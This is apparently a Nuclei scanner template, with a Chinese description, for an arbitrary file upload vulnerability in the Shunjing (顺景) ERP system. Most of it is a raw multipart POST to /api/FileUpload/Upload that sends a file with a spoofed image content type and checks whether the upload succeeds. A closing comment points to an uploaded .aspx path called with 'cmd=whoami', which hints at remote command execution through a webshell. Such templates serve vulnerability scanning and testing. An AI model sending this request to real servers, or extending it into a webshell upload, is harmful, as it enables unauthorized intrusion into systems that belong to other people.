id: sjerp-FileUpload-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 顺景ERP管理系统FileUpload存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%A1%BA%E6%99%AFERP/%E9%A1%BA%E6%99%AFERP%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FFileUpload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /api/FileUpload/Upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close
        Content-Length: 689

        ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
        Content-Disposition: form-data; name="file"; filename="1.txt"
        Content-Type: image/png

        1
        ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
    matchers:
      - type: word
        part: body
        words:
          - '.txt'
#文件路径/UpFiles/GUID值.aspx?cmd=whoami